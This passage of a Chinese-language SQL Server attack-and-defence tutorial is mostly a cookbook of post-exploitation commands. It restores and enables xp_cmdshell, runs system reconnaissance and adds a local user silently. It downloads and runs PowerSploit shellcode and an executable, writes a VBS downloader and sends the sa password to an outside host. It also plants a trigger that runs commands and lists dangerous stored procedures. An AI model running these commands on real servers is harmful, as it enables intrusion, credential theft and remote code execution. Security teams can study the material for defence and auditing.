+<p>代码判断一系列存储过程是否存在，若不存在则恢复。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_cmdshell]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_cmdshell&#x27;,&#x27;xplog70.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_dirtree]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_dirtree&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_fixeddrives]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_fixeddrives&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_regwrite]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_regwrite&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_regread]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_regread&#x27;,&#x27;xpstar.dll&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-5.png"></p>
+<p><strong>开启xp_cmdshell存储过程</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE; exec SP_CONFIGURE &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-6.png"></p>
+<p><strong>关闭xp_cmdshell存储过程</strong></p>
+<p>关闭xp_cmdshell配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-7.png"></p>
+<p>删除xp_cmdshell的语句:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_dropextendedproc &#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的xp_cmdshell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop procedure xp_cmdshell;</span><br><span class="line">exec sp_addextendedproc &quot;xp_cmdshell&quot;, &quot;xplog70.dll&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>附录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc xp_cmdshell ,@dllname =&#x27;xplog70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_enumgroups ,@dllname =&#x27;xplog70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_loginconfig ,@dllname =&#x27;xplog70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_enumerrorlogs ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_getfiledetails ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OACreate ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OADestroy ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OAGetProperty ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OAMethod ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OASetProperty ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OAStop ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regaddmultistring ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regdeletekey ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regdeletevalue ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regenumvalues ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regremovemultistring ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regwrite ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_dirtree ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regread ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_fixeddrives ,@dllname =&#x27;xpstar.dll&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>xp_cmdshell执行系统命令</strong></p>
+<p><strong>xp_cmdshell执行whoami命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell &#x27;whoami&#x27;</span><br><span class="line">exec master.dbo.xp_cmdshell &quot;whoami&quot;</span><br><span class="line">exec xp_cmdshell &quot;whoami&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-15.png"></p>
+<p><strong>xp_cmdshell执行ipconfig/all命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;ipconfig/all&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-9.png"></p>
+<p><strong>查询操作系统和版本信息（分别对应中英文系统）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-14.png"></p>
+<p><strong>通过xp_cmdshell执行wmic 获取系统信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors/Format:List&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-13.png"></p>
+<p><strong>调用reg query注册表键值判断RDP服务的端口号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-8.png"></p>
+<p><strong>通过xp_cmdshell执行添加testuser1用户并且不输出结果</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;Net user testuser1 passwd1 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add&#x27;,NO_OUTPUT</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-11.png"></p>
+<p><strong>通过xp_cmdshell删除testuser1用户并且不输出结果</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell <span class="string">&#x27;net user testuser1/delete&#x27;</span>, NO_OUTPUT</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-10.png"></p>
+<p>通过xp_cmdshell执行taskkill 杀死taskmgr.exe，taskmgr.exe用于任务管理器。它显示系统中正在运行的进程。该程序使用Ctrl+Alt+Del（一般是弹出Windows安全再点击“任务管理器”）或者Ctrl+Shift+Esc打开，这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell <span class="string">&#x27;taskkill /f /im taskmgr.exe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>调用xp_cmdshell执行mkdir命令创建目录</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell <span class="string">&#x27;mkdir &quot;C:\test\&quot; &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-12.png"></p>
+<p><strong>通过xp_cmdshell执行dir命令</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell <span class="string">&#x27;dir c:\&#x27;</span></span><br><span class="line">exec xp_cmdshell <span class="string">&#x27;dir c:\&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-22.png"></p>
+<p><strong>通过xp_cmdshell删除文件</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell <span class="string">&#x27;del C:\test&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>xp_cmdshell调用Powershell</strong></p>
+<p>通过xp_cmdshell调用powershell 下载<a target="_blank" rel="external nofollow noopener noreferrer" href="http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1">http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell <span class="string">&#x27;powershell -c &quot;iex((new-object Net.WebClient).DownloadString(&#x27;</span><span class="string">&#x27;http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1&#x27;</span><span class="string">&#x27;))&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-23.png"></p>
+<p>调用xp_cmdshell执行echo CreateObject最后写入C:/ProgramData/vget.vbs文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell <span class="string">&#x27;echo Set x= CreateObject(^&quot;Microsoft.XMLHTTP^&quot;):x.Open ^&quot;GET^&quot;,LCase(WScript.Arguments(0)),0:x.Send():Set s = CreateObject(^&quot;ADODB.Stream^&quot;):s.Mode = 3:s.Type = 1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 &gt; C:/ProgramData/vget.vbs&#x27;</span>; </span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-24.png"></p>
+<p>通过xp_cmdshell调用cmd.exe 执行powershell 调用OpenRead方法向数据库发送登录用户名sa密码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell <span class="string">&#x27;powershell (new-object System.Net.WebClient).OpenRead(&#x27;</span><span class="string">&#x27;http://example/test.jsp?data=127.0.0.1%7c1433%7csa%7cDb123456&#x27;</span><span class="string">&#x27;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-25.png"></p>
+<p>通过xp_cmdshell调用powershell下载test0.exe后并执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell <span class="string">&#x27;&quot;echo $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(&quot;http://example/test0.exe&quot;,&quot;%TEMP%\test.exe&quot;) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create &quot;%TEMP%\test.exe&quot;&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="xp-regread"><a href="#xp-regread" class="headerlink" title="xp_regread"></a>xp_regread</h3><p>SQL Server存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring等。</p>
+<p><strong>读注册表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regread &#x27;HKEY_current_user&#x27;,&#x27;Control Panel\International&#x27;,&#x27;sCountry&#x27;</span><br><span class="line">exec xp_regread N&#x27;HKEY_LOCAL_MACHINE&#x27;, N&#x27;SYSTEM\CurrentControlSet\Services\MSSEARCH&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-1.png"></p>
+<p><strong>枚举可用的注册表键值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regenumkeys &#x27;HKEY_CURRENT_USER&#x27;,&#x27;Control Panel\International&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-2.png"></p>
+<h3 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h3><p>判读文件是否存在，第一列返回0表示文件不存在，返回1表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功。</p>
+<p><strong>判读文件是否存在</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_fileexist &#x27;C:\\test\test.txt&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-3.png"></p>
+<p><strong>列出当前目录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_subdirs &quot;C:\\&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-4.png"></p>
+<h3 id="xp-getnetname"><a href="#xp-getnetname" class="headerlink" title="xp_getnetname"></a>xp_getnetname</h3><p><strong>获取服务器名称</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_getnetname</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-5.png"></p>
+<h3 id="xp-msver"><a href="#xp-msver" class="headerlink" title="xp_msver"></a>xp_msver</h3><p><strong>获取服务器信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_msver</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-6.png"></p>
+<h3 id="xp-fixeddrives"><a href="#xp-fixeddrives" class="headerlink" title="xp_fixeddrives"></a>xp_fixeddrives</h3><p><strong>获取磁盘空间信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_fixeddrives</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-7.png"></p>
+<p>附常用的一些危险的存储过程，可自查存储过程的功能和用法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_enumgroups</span><br><span class="line">xp_fixeddrives</span><br><span class="line">xp_loginconfig</span><br><span class="line">xp_enumerrorlogs</span><br><span class="line">xp_getfiledetails</span><br><span class="line">Sp_OACreate</span><br><span class="line">Sp_OADestroy</span><br><span class="line">Sp_OAGetErrorInfo</span><br><span class="line">Sp_OAGetProperty</span><br><span class="line">Sp_OAMethod</span><br><span class="line">Sp_OASetProperty</span><br><span class="line">Sp_OAStop</span><br><span class="line">Xp_regaddmultistring</span><br><span class="line">Xp_regdeletekey</span><br><span class="line">Xp_regdeletevalue</span><br><span class="line">Xp_regenumvalues</span><br><span class="line">Xp_regread</span><br><span class="line">Xp_regremovemultistring</span><br><span class="line">Xp_regwrite</span><br><span class="line">sp_makewebtask</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL-Server-触发器"><a href="#SQL-Server-触发器" class="headerlink" title="SQL Server 触发器"></a>SQL Server 触发器</h2><p>SQL Server 触发器用于执行指定动作之后执行sql语句，比如配合update触发sql语句。</p>
+<p>首先创建一个test表，插入字段值。</p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-10.png"></p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-11.png"></p>
+<p>创建一个名为test1的触发器，当test表执行update动作时，触发test1执行xp_cmdshell命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set ANSI_NULLS on</span><br><span class="line">go</span><br><span class="line">set QUOTED_IDENTIFIER on</span><br><span class="line">go</span><br><span class="line">create trigger [test1]</span><br><span class="line">on [test]</span><br><span class="line">AFTER UPDATE as</span><br><span class="line">begin</span><br><span class="line">	execute master..xp_cmdshell &#x27;cmd.exe /c calc.exe&#x27;</span><br><span class="line">end</span><br><span class="line">go</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-12.png"></p>
+<p>执行下列更新test表操作，test1触发器触发。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE test SET name = &#x27;wangwu&#x27; WHERE LastName = &#x27;zhangsan&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-13.png"></p>
+<h2 id="SQL-Server-COM组件"><a href="#SQL-Server-COM组件" class="headerlink" title="SQL Server COM组件"></a>SQL Server COM组件</h2><p>SQL Server中的COM组件SP_OACREATE，执行系统命令，但是此利用方法无回显。</p>
+<h3 id="SP-OACREATE"><a href="#SP-OACREATE" class="headerlink" title="SP_OACREATE"></a>SP_OACREATE</h3><p>查看SP_OACREATE状态。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-26.png"></p>
+<p>利用count(*)判断是否存在，，存在即返回1。</p>
